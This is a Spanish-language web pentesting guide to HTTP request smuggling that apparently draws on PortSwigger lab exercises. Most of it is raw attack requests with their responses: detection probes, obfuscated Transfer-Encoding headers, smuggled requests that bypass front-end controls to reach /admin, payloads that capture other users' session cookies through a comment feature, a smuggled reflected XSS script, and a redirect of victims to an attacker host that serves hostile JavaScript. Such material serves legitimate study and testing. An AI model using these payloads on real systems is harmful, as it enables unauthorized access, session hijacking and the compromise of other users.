# HTTP Request Smuggling

***NOTA IMPORTANTE: Por lo general la explotación se presenta a través del método POST.***

* * *

Las aplicaciones web actuales emplean con frecuencia cadenas de servidores HTTP entre los usuarios y la lógica de aplicación definitiva.

Los usuarios envían solicitudes a un servidor de aplicaciones (load balancer o proxy inverso) y este servidor envía las solicitudes a uno o más servidores de servicios de fondo. Las solicitudes HTTP se envían una tras otra, y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde **termina una solicitud** y **comienza la siguiente**.

El contrabando de solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa las secuencias de solicitudes HTTP que se reciben de uno o más usuarios.

* * *

## Summary

- [Introduction](#introduction)
- [How to Perform an HTTP Request Smuggling Attack](#how-to-perform-an-http-request-smuggling-attack)
- [Vulnerability CL - TE](#vulnerability-cl---te)
- [Vulnerability TE - CL](#vulnerability-te---cl)
	- [Nota Importantisima](#nota-importante)
- [Ofuscar el Header TE (TE - TE)](#ofuscar-el-header-te--%28-te---te-%29 "#ofuscar-el-header-te--(-te---te-)")
- [Detection 01](#detection-01)
    - [CL - TE con Técnica de Sincronización](#cl---te-con-tecnica-de-sincronizacion)
    - [TE - CL con Técnica de Sincronización](#te---cl-con-tecnica-de-sincronizacion)
- [Detection 02](#detection-02)
    - [CL - TE con Respuestas HTTP Distintas](#cl---te-con-respuestas-http-distintas)
    - [TE - CL con Respuestas HTTP Distintas](#te---cl-con-respuestas-http-distintas)
- [Considerations](#considerations)
- [Exploit - Bypass Front-End Security Controls](#exploit---bypass-frontend-security-controls)
	- [CL - TE](#cl---te)
	- [TE - CL](#te---cl)
- [Revelar Reescritura de Request de Front-End](#revelear-reescritura-de-request-de-frontend)
- [Capturar Request de Usuarios](#capturar-request-de-usuarios)
- [HTTP Request Smuggling to XSS](#http-request-smuggling-to-xss)
- [Controlled Redirect to Open Redirect](#controlled-redirect-to-open-redirect)

* * *

## Introduction

La mayoría de las vulnerabilidades de HTTP Request Smuggling surgen porque la especificación HTTP proporciona **dos formas diferentes** de especificar dónde termina una solicitud:

- header `Content-Length`.
- header `Transfer-Encoding`.

El header `Content-Lengt` especifica la longitud del cuerpo del mensaje en **bytes**:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

El header `Transfer-Encoding` se puede usar para especificar que el **BODY** del mensaje usa codificación fragmentada.
Esto significa que el **BODY** del mensaje contiene uno o más fragmentos de datos. Cada fragmento consta del tamaño en bytes (expresado en hexadecimal), seguido de una nueva línea, seguido del contenido del fragmento. El mensaje termina con un fragmento de tamaño cero:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

**Dado que la especificación HTTP proporciona dos métodos diferentes para especificar la longitud de los mensajes HTTP, es posible que un solo mensaje utilice ambos métodos a la vez**, de modo que entren en conflicto entre sí.

La especificación HTTP intenta evitar este problema indicando que si los headers `Content-Length` y `Transfer-Encoding` están presentes, **el header `Content-Length` debe ignorarse.**

Esto puede ser suficiente para evitar la ambigüedad cuando solo hay un servidor en juego, pero no cuando dos o más servidores están encadenados.

En esta situación, pueden surgir problemas por dos razones:

- Algunos servidores no admiten el header `Transfer-Encoding` en las solicitudes.
    
- Se puede inducir a algunos servidores que admiten el encabezado `Transfer-Encoding` a no procesarlo, si el encabezado está ofuscado de alguna manera.
    

Si los servidores `front-end` y `back-end` se comportan de manera diferente en relación con el header `Transfer-Encoding` (posiblemente ofuscado) , es posible que no estén de acuerdo sobre los límites entre las solicitudes sucesivas, lo que lleva a vulnerabilidades de HTTP Request Smuggling.

* * *

## How to Perform an HTTP Request Smuggling Attack

Los ataques implican colocar tanto el header `Content-Length` como el header `Transfer-Encoding` en una sola request HTTP y manipularlos para que los servidores `front-end` y `back-end` procesen la solicitud de manera diferente.

La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

- **`CL.TE`**: El servidor `front-end` usa el header `Content-Length` y el servidor `back-end` usa el header `Transfer-Encoding`.
    
- **`TE.CL`**: El servidor `front-end` usa el header `Transfer-Encoding` y el servidor `back-end` usa el header `Content-Length`.
    
- **`TE.TE`**: Los servidores `front-end` y `back-end` admiten el header `Transfer-Encoding`, pero se puede inducir a uno de los servidores a que **no** lo procese, ofuscando el header de alguna manera.
    

* * *

## Vulnerability CL - TE

El servidor `front-end` usa el header `Content-Lengt` y el servidor `back-end` usa el header `Transfer-Encoding`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

El servidor `front-end` procesa el header `Content-Length` y determina que el cuerpo de la solicitud tiene 13 bytes de longitud, hasta el final de `SMUGGLED`. Esta solicitud se reenvía al servidor `back-end`.

El servidor `back-end` procesa el header `Transfer-Encoding` y, por lo tanto, trata el cuerpo del mensaje como si usara una codificación fragmentada.

Procesa el primer fragmento, que tiene una longitud cero, por lo que se trata como si finalizara la solicitud. Los siguientes bytes `SMUGGLED` se dejan sin procesar y el servidor `back-end` los tratará como el inicio de la siguiente request.

Ejemplo:

Envíe la request dos veces y observe sus respuestas:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

* * *

## Vulnerability TE - CL

### **NOTA IMPORTANTÍSIMA: La representación de los caracteres `8` y `5c` de los siguientes ejemplos, representan en HEXADECIMAL, la cantidad de `bytes` que vienen luego de que el servidor `back-end` rechaza los caracteres insertados y que provocan el contrabando de la solicitud.**

Puede ver sus valores en:

[La tabla ASCII de valores en Hexadecimal](https://www.asciitable.com/)


El servidor `front-end` usa el header `Transfer-Encoding` y el servidor `back-end` usa el header `Content-Length`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Para enviar esta solicitud usando Burp Repeater, primero deberá ir al menú Repeater y asegurarse de que la opción "Actualizar contenido-longitud" no esté marcada.

Debe incluir la secuencia final `\r``\n``\r``\n` después de `0`.

El servidor `front-end` procesa el header `Transfer-Encoding` y, por lo tanto, trata el cuerpo del mensaje como si utilizara una codificación fragmentada.

Procesa el primer fragmento, que se dice que tiene una longitud de `8 bytes`, hasta el comienzo de la línea siguiente `SMUGGLED`.
Procesa el segundo fragmento, que tiene una longitud `0`, por lo que se trata como si finalizara la solicitud. Esta solicitud se reenvía al servidor `back-end`.

El servidor `back-end` procesa el header `Content-Lengt` y determina que el cuerpo de la solicitud tiene `3 bytes` de longitud, hasta el comienzo de la línea siguiente `8`. Los siguientes bytes `SMUGGLED`, se dejan sin procesar, y el servidor `back-end` los tratará como el inicio de la siguiente solicitud en la secuencia.

Ejemplo: (note que al final deben darse dos ENTER o SALTOS DE LINEA sin espacios)

Envíe la request dos veces y observe sus respuestas: (Recuerde la [NOTA IMPORTANTISIMA sobre TE - CL](#nota-importante), `5c` representa los bytes en hexadecimal de todos los caracteres que vienen después de la request contrabandeada, hasta antes del carácter `0`)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
[enter]
[enter]
```

1ra Response:

```
HTTP/1.1 200 OK
```

2da Response:

```
HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"
```

* * *

## Ofuscar el Header TE (TE - TE)

Los servidores `front-end` y `back-end` admiten el header `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo ofuscando el header de alguna manera.

Hay formas potencialmente infinitas de ofuscar el header `Transfer-Encoding`:

```
Transfer-Encoding: xchunked
```

```
Transfer-Encoding : chunked
```

```
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```
Transfer-Encoding:[tab]chunked
```

```
[space]Transfer-Encoding: chunked
```

```
X: X[\n]Transfer-Encoding: chunked
```

```
Transfer-Encoding
: chunked
```

Cada una de estas técnicas implica una desviación sutil de la especificación HTTP.

El código del mundo real que implementa una especificación de protocolo, rara vez se adhiere a él con absoluta precisión, y es común que diferentes implementaciones toleren diferentes variaciones de la especificación.

Para descubrir una vulnerabilidad `TE.TE`, es necesario encontrar alguna variación del header `Transfer-Encoding`, de modo que solo uno de los servidores `front-end` o `back-end` lo procese, mientras que el otro servidor lo ignora.

Dependiendo de si se puede inducir al servidor `front-end` o `back-end` a que no procese el header `Transfer-Encoding` ofuscado, será posible explotar las técnicas `CL.TE` o `TE.CL` ya descritas.

Ejemplo: (note que al final deben darse dos ENTER o SALTOS DE LINEA sin espacios)

Envíe 2 veces.

La idea acá es que el servidor `back-end` acepte el header `Content-Lenght`, ya que se bypassea el header `Transer-Encoding` utilizando el valor de `bypass`:

```
POST / HTTP/1.1
Host: ac051f461eb36745803b3009005200fe.web-security-academy.net
Cookie: session=twKRTVBSh7BTO0IPXl0TqbV2AF1iSLJj
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: bypass

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
[enter]
[enter]
```

1ra Response:

```
HTTP/1.1 200 OK
```

2da Response:

```
HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"
```

* * *

## Detection 01

Verifique en primer lugar alguna de estas dos detecciones.

* * *

### CL - TE con Técnica de Sincronización

Enviar una solicitud como la siguiente a menudo causará un retraso de tiempo:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Dado que el servidor `front-end` utiliza el header `Content-Length`, solo reenviará parte de esta solicitud, omitiendo el carácter `X`. El servidor `back-end` usa el header `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente. **Esto provocará un retraso de tiempo observable**.

* * *

### TE - CL con Técnica de Sincronización

Enviar una solicitud como la siguiente a menudo provocará un retraso de tiempo:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Dado que el servidor `front-end` utiliza el header `Transfer-Encoding`, solo reenviará parte de esta solicitud, omitiendo el carácter `X`. El servidor `back-end` usa el header `Content-Length`, espera más contenido en el cuerpo del mensaje y espera a que llegue el contenido restante. **Esto provocará un retraso de tiempo observable o a veces un error `500 Internal Server Error`.**

La prueba basada en el tiempo para las vulnerabilidades de `TE.CL` interrumpirá a otros usuarios de la aplicación si la aplicación es vulnerable a la variante `CL.TE` de la vulnerabilidad. Por lo tanto, para ser sigiloso y minimizar las interrupciones, primero debe usar la prueba `CL.TE` y continuar con la prueba `TE.CL` solo si la primera prueba no tiene éxito.

* * *

## Detection 02

Cuando se ha detectado una probable vulnerabilidad, puede obtener más pruebas de la vulnerabilidad explotándola para desencadenar **diferencias en el contenido de las respuestas de la aplicación**.

Esto implica enviar dos solicitudes a la aplicación en rápida sucesión:

- Una solicitud de "ataque" diseñada para interferir con el procesamiento de la siguiente solicitud.
- Una solicitud "normal".

Si la respuesta a la solicitud normal contiene la interferencia esperada, se confirma la vulnerabilidad.

Por ejemplo, suponga que la solicitud normal se ve así:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Esta solicitud normalmente recibe una respuesta HTTP con el código de estado 200, que contiene algunos resultados de búsqueda.

La solicitud de ataque que se necesita para interferir con esta solicitud depende de la variante de contrabando de solicitudes que esté presente: `CL.TE` vs `TE.CL`.

* * *

### CL - TE con Respuestas HTTP Distintas

Para confirmar una vulnerabilidad `CL.TE`, envíe una solicitud de ataque como esta:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Si el ataque tiene éxito, las dos últimas líneas de esta solicitud son tratadas por el servidor `back-end` como pertenecientes a la siguiente solicitud que se recibe.

Esto hará que la siguiente solicitud "normal" se vea así:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Dado que esta solicitud ahora contiene una URL no válida, el servidor responderá con el código de estado 404, lo que indica que la solicitud de ataque efectivamente interfirió con ella.

Ejemplo:

Envíe la request:

```
POST / HTTP/1.1
Host: vulnerable.com
Cookie: [cookie]
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

GET /notexist HTTP/1.1
X-Ignore: X
```

La 1ra respuesta mostrará el contenido normal:

```
HTTP/1.1 200 OK
```

La 2da respuesta mostrará un error `404 Not Found` debido a que el recurso `GET /notexist` no existe.

```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=0
Connection: close
Content-Length: 11

"Not Found"
```

* * *

### TE - CL con Respuestas HTTP Distintas

Para confirmar una vulnerabilidad `TE.CL`, envíe una solicitud de ataque como esta:  (Recuerde la [NOTA IMPORTANTISIMA sobre TE - CL](#nota-importante))
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
[enter]
[enter]
```

Para enviar esta solicitud usando Burp Repeater, primero deberá ir al menú Repeater y asegurarse de que la opción "Actualizar contenido-longitud" no esté marcada. Debe incluir la secuencia final `\r``\n``\r``\n` después del `0` final.

Si el ataque tiene éxito, el servidor `back-end` trata a todo lo que está adelante de `GET /404`  como si perteneciera a la siguiente solicitud que se reciba. Esto hará que la siguiente solicitud "normal" se vea así:
```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Dado que ésta solicitud ahora contiene una URL no válida, el servidor responderá con el código de estado `404`, lo que indica que la solicitud de ataque efectivamente interfirió con ella.

Ejemplo:

Envíe la request:
```
POST / HTTP/1.1
Host: vulnerable.com
Cookie: session=WLQAvhV4risR2BqQDaL21HBWVMJe4DdC
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-length: 15

x=1
0
[enter]
[enter]
```

**Recuerde que el valor de `5e` representa al número `94` en la representación HEXADECIMAL de toda la cadena que quedará en la contaminación de la siguiente request**. Es decir, de la petición maliciosa, la siguiente parte de esa request es la que suma `94 bytes`, y dicho número es `5e` en HEXADECIMAL:

```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-length: 15

x=1
```

La 1ra respuesta mostrará el contenido normal:

```
HTTP/1.1 200 OK
```

La 2da respuesta mostrará un error `404 Not Found` debido a que el recurso `POSt /404` no existe.

```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=0
Connection: close
Content-Length: 11

"Not Found"
```




***

## Considerations

Se deben tener en cuenta algunas consideraciones importantes al intentar confirmar las vulnerabilidades de contrabando de solicitudes mediante la interferencia con otras solicitudes:

- [ ] La solicitud de "ataque" y la solicitud "normal" deben enviarse al servidor utilizando diferentes conexiones de red. Enviar ambas solicitudes a través de la misma conexión no probará que existe la vulnerabilidad.

- [ ] La solicitud de "ataque" y la solicitud "normal" deben utilizar la misma URL y los mismos nombres de parámetros, en la medida de lo posible. Esto se debe a que muchas aplicaciones modernas enrutan las solicitudes de front-end a diferentes servidores back-end en función de la URL y los parámetros. El uso de la misma URL y los mismos parámetros aumenta la posibilidad de que las solicitudes sean procesadas por el mismo servidor back-end, lo cual es esencial para que el ataque funcione.

- [ ] Al probar la solicitud "normal" para detectar cualquier interferencia de la solicitud de "ataque", está en una carrera con cualquier otra solicitud que la aplicación esté recibiendo al mismo tiempo, incluidas las de otros usuarios. Debe enviar la solicitud "normal" inmediatamente después de la solicitud de "ataque". Si la aplicación está ocupada, es posible que deba realizar varios intentos para confirmar la vulnerabilidad.

- [ ] En algunas aplicaciones, el servidor de aplicaciones para el usuario funciona como un equilibrador de carga y reenvía las solicitudes a diferentes sistemas de fondo de acuerdo con algún algoritmo de equilibrio de carga. Si sus solicitudes de "ataque" y "normales" se envían a diferentes sistemas de back-end, el ataque fallará. Esta es una razón adicional por la que es posible que deba intentarlo varias veces antes de que se pueda confirmar una vulnerabilidad.

- [ ] Si su ataque logra interferir con una solicitud posterior, pero esta no era la solicitud "normal" que envió para detectar la interferencia, esto significa que otro usuario de la aplicación se vio afectado por su ataque. Si continúa realizando la prueba, esto podría tener un efecto perjudicial en otros usuarios, y debe tener cuidado.

***

## Exploit - Bypass Front-End Security Controls

En algunas aplicaciones, el servidor `front-end` se utiliza para implementar algunos controles de seguridad, decidiendo si permitir el procesamiento de solicitudes individuales. Las solicitudes permitidas se reenvían al servidor de `back-end`, donde se considera que han pasado por los controles de `front-end`.

Por ejemplo, suponga que una aplicación utiliza el servidor `front-end` para implementar restricciones de control de acceso , y solo reenvía solicitudes si el usuario está autorizado a acceder a la URL solicitada. El servidor `back-end` acepta todas las solicitudes sin más comprobaciones. En esta situación, se puede utilizar una vulnerabilidad de contrabando de solicitudes HTTP para eludir los controles de acceso, mediante el contrabando de una solicitud a una URL restringida.

***

### CL - TE

Suponga que el usuario actual tiene permiso para acceder a `/home` pero no a `/admin`. Puede eludir esta restricción mediante el siguiente ataque:

Intente acceder a algún panel privado, por ejemplo `GET /admin` y observará una respuesta `403 Forbidden`:
```
GET /admin HTTP/1.1
Host: vulnerable.com
```
```
HTTP/1.1 403 Forbidden

"Path /admin is blocked"
```

Luego, cambie el método HTTP a `POST` si es el caso, y explote su solicitud para ingresar a `GET /admin`, cambiando además el header `Host: vulnerable.com` a `Host: localhost` si es necesario:
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
```
HTTP/1.1 200 OK
```

***

### TE - CL

Suponga que el usuario actual tiene permiso para acceder a `/home` pero no a `/admin`. Puede eludir esta restricción mediante el siguiente ataque:

Intente acceder a algún panel privado, por ejemplo `GET /admin` y observará una respuesta `403 Forbidden`:

```
GET /admin HTTP/1.1
Host: vulnerable.com
```
```
HTTP/1.1 403 Forbidden

"Path /admin is blocked"
```

Luego, cambie el método HTTP a `POST` si es el caso, y explote su solicitud para ingresar a `POST /admin`: 

*NOTE LOS 2 ESPACIOS FINALES DE LA REQUEST, ASÍ COMO TAMBIÉN EL NÚMERO 60 EN HEXADECIMAL Y LA MODIFICACIÓN DEL Content-Length PARA QUE NO SE ACTUALICE AUTOMÁTICAMENTE*)
```
POST / HTTP/1.1
Host: vulnerable.com
Cookie: session=OuiWVDlTcc3Hxzqqub5D8DciPb0CCLx3
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
[enter]
[enter]
```
```
HTTP/1.1 401 Unauthorized
```

Como la solicitud devuelve `401 Unauthorized`, modifique el header `Host: vulnerable.com` a `Host: localhost` para su explotación:
```
POST / HTTP/1.1
Host: ac021f411e3ca7be80a1450c00fc00c2.web-security-academy.net
Cookie: session=OuiWVDlTcc3Hxzqqub5D8DciPb0CCLx3
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
[enter]
[enter]
```
```
HTTP/1.1 200 OK
```

***

## Revelar Reescritura de Request de Front-End

En muchas aplicaciones, el servidor `front-end` realiza una reescritura de las solicitudes antes de que se reenvíen al servidor `back-end`, generalmente agregando algunos headers adicionales. 

Por ejemplo, el servidor `front-end` podría:

- Terminar la conexión TLS y agregar algunos headers que describan el protocolo y los cifrados que se utilizaron.

- Agregar un header `X-Forwarded-For` que contenga la dirección IP del usuario.

- Determinar la identificación del usuario en función de su token de sesión y agregar un header que identifique al usuario.

- Agregar información sensible que sea de interés para otros ataques.


Si a sus solicitudes de contrabando les faltan algunos encabezados que normalmente agrega el servidor `front-end`, es posible que el servidor `back-end` no procese las solicitudes de la forma habitual, lo que provocará que las solicitudes de contrabando **no causen ningún efecto de explotación**.

Existe una forma sencilla de revelar exactamente cómo el servidor de aplicaciones para el usuario está reescribiendo las solicitudes. 
Para hacer esto, debe realizar los siguientes pasos:

1. Busque una solicitud `POST` que refleje el valor de un parámetro de solicitud en la respuesta de la aplicación.

2. Mezcle los parámetros, para que el parámetro reflejado aparezca en último lugar en el cuerpo del mensaje.

3. Pase de contrabando esta solicitud al servidor `back-end`, seguida directamente por una solicitud normal cuyo formulario reescrito desea revelar.

A continuación se explota `CL.TE`:

Intente acceder a algún panel privado, por ejemplo `GET /admin` y observará una respuesta `403 Forbidden` o `401 Unauthorized`:

```
GET /admin HTTP/1.1
Host: vulnerable.com
```
```
HTTP/1.1 401 Unauthorized
```

Luego, busque una request que le permite ver reflejado en el navegador algún texto que se usted inserte. Las secciones de "búsqueda" son geniales para este propósito:
```
POST / HTTP/1.1
Host: vulnerable.com

search=test
```
```
HTTP/1.1 200 OK

<h1>
	1 search results for 'test'
</h1>
```

Acto seguido, utilice este endpoint de búsqueda (que para este caso es el path principal `POST /`) y pase de contrabando su request:

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Envíe la request dos veces rápidamente y verá reflejada en la response los headers FALTANTES de la requets que acaba de realizar:
```
<section class=blog-header>
	<h1>0 search results for 'testPOST / HTTP/1.1
	X-xnAndX-Ip: 181.61.60.225
	Host: vulnerable.com
	Cookie: session=wbhHVFpwyFSALoKGTJfIbsBdCW1QmzqX
	User-Agent: Mozilla/5.0 (Wind'</h1>
	<hr>
</section>
```


Para este caso, el header `X-xnAndX-Ip: 181.61.60.225` lo agrega el servidor `front-end`, por ende no es posible visualizarlo desde el enfoque blackbox. 

Ahora, apunte al panel `GET /admin`, pero agregando este nuevo header y cambiándole el valor al de la IP local `127.0.0.1`:
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 144
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-xnAndX-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

x=1
```

Para más info al respecto, por favor visite los laboratorios de [Portswigger](https://portswigger.net/web-security/request-smuggling/exploiting).

***

## Capturar Request de Usuarios

Si la aplicación contiene algún tipo de funcionalidad que permita almacenar y recuperar datos textuales, entonces el contrabando de solicitudes HTTP se puede utilizar para capturar el contenido de las solicitudes de otros usuarios. 

Es probable que estos incluyan tokens de sesión, que permitan ataques de secuestro de sesiones u otros datos confidenciales enviados por el usuario. Las funciones adecuadas para usar como vehículo para este ataque serían comentarios, correos electrónicos, descripciones de perfil, nombres de pantalla, etc.

Para realizar el ataque, debe pasar de contrabando una solicitud que envía datos a la función de almacenamiento, con el parámetro que contiene los datos en último lugar en la solicitud. La siguiente solicitud que es procesada por el servidor `back-end` se agregará a la solicitud de contrabando, con el resultado de que la solicitud sin procesar de otro usuario se almacenará cuando visite la web.

A continuación se explota `CL.TE`:

Busque alguna funcionalidad de almacenamiento de datos en el aplicativo. Por ejemplo, publicar un comentario:


El parámetro que se refleja de la request, envíelo al final de la cadena en la request, para que el delimitador `&` no afecte a su explotación, ya que éste finaliza la request cuando la encuentra en el `back-end`.

Además, si la respuesta es amplia, aumente el `Content-Lenght` tanto como considere necesario.

Realice un comentario donde se refleja la entrada del usuario:
```
POST /post/comment HTTP/1.1
Host: vulnerable.com
Cookie: session=RyVzDmXa6YB1KiRUq6koSGdzAcn4i5WQ
Content-Length: 121

csrf=ISe235B2qbi5rcBWzsgBBeEENhyam07W&postId=2&comment=test1&name=test123&email=test%40test.test&website=http%3A%2F%2Fa.a
```

Verifique que se refleja el parámetro `comment`. Ahora, cambie de lugar éste parámetro y colóquelo en la última posición de la petición:
```
POST /post/comment HTTP/1.1
Host: vulnerable.com
Cookie: session=RyVzDmXa6YB1KiRUq6koSGdzAcn4i5WQ
Content-Length: 121

csrf=ISe235B2qbi5rcBWzsgBBeEENhyam07W&postId=2&name=test123&email=test%40test.test&website=http%3A%2F%2Fa.a&comment=test1
```

Realice su ataque, notando que es `CL.TE` y la segunda petición quedará a la espera de que el usuario víctima visite la web en cualquier recurso (por ejemplo `GET /home`, `GET /admin`, `GET /`), entonces se ejecutará la request que pasó de smuggling y dejará un comentario con el header `Cookie: <value>`, el cual podrá utilizar para suplantarla:
```
POST / HTTP/1.1
Host: vulnerable.com
Cookie: session=RyVzDmXa6YB1KiRUq6koSGdzAcn4i5WQ
Content-Length: 277
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 728
Cookie: session=RyVzDmXa6YB1KiRUq6koSGdzAcn4i5WQ

csrf=ISe235B2qbi5rcBWzsgBBeEENhyam07W&postId=2&name=Caarlos+Montoya&email=carlos%40normal-user.net&website=&comment=aaaaa
```

Note que debe ir modificando el valor `Content-Lenght: <valorAModificar>` de acuerdo a la cantidad de caracteres posibles reflejados en la respuesta del aplicativo.

***

## HTTP Request Smuggling to XSS

Si encuentra un XSS Reflected en su aplicación víctima, junto con HTTP Request Smuggling, intente explotar el XSS Reflected para escalar su criticidad a media-alta. Principalmente para los XSS que no tienen impacto, porque el usuario nunca agregaría un payload intencionalmente.

Suponga que el header `User-Agent` es vulnerable a XSS Reflected en el endpoint `GET /post?postId=<value>`:
```
User-Agent: Mozilla"/><script>alert(1)</script>
```

Y la explotación es `CL.TE`, realice su request maliciosa:
```
POST / HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"/><script>alert(1)</script>
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

***

## Controlled Redirect to Open Redirect 

Muchas aplicaciones realizan redireccionamientos en el sitio de una URL a otra y colocan el nombre del `host` en el header  `Host:` de la solicitud en la URL de redireccionamiento. 

Un ejemplo de esto es el comportamiento predeterminado de los servidores web `Apache` e `IIS`, donde una solicitud de una carpeta sin una barra al final recibe una redirección a la misma carpeta que incluye la barra al final:
```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Este comportamiento normalmente se considera inofensivo, pero se puede aprovechar en un ataque de contrabando de solicitudes para redirigir a otros usuarios a un dominio externo.

La explotación es `CL.TE`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
La solicitud de contrabando desencadenará una redirección al sitio web del atacante `attacker-website.com`, lo que afectará la solicitud del siguiente usuario procesada por el servidor `back-end`:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Aquí, la solicitud del usuario fue un archivo JavaScript `GET /scripts/include.js` como se puede observar arriba, que fue importado por una página en el sitio web. El atacante puede comprometer completamente al usuario víctima devolviendo su propio fichero JavaScript `/scripts/include.js` en la respuesta.

***
